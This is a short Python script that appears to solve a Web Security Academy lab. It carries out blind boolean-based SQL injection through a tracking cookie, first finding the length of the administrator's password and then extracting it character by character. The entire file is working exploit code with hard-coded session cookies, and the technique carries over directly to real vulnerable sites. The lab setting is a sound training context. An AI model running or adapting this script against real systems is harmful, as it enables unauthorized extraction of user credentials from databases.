import requests
url = "https://0add00e30366d3fc886a374000d70055.web-security-academy.net"
cookie = {'TrackingId': 'CE8g8M6RzsNCarzq', 'session': 'wpawcBAavdaMO9aSHD012IjVsUzgBCBU'}
def get_length():
    for l in range(1, 30):
        payload = f"' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > {l})='administrator' --"
        test_cookie = cookie.copy()
        test_cookie['TrackingId'] = cookie['TrackingId'] + payload
        r = requests.get(url, cookies=test_cookie)
        if "Welcome back!" not in r.text:
            return l
        
def brute():
    temp = ""
    for i in range(1, 21):
        for j in range(32, 126):
            char = chr(j)
            payload = f"' AND (SELECT ascii(substring(password,{i},1)) FROM users WHERE username='administrator') = {j} --"
            test_cookie = cookie.copy()
            test_cookie['TrackingId'] = cookie['TrackingId'] + payload           
            r = requests.get(url, cookies=test_cookie)            
            if "Welcome back!" in r.text:
                temp += char
                print(f"Found character {i}: {char}")
                break   
    return temp
length = get_length()
print (length)
password = brute()
print(f"\nFull password: {password}")
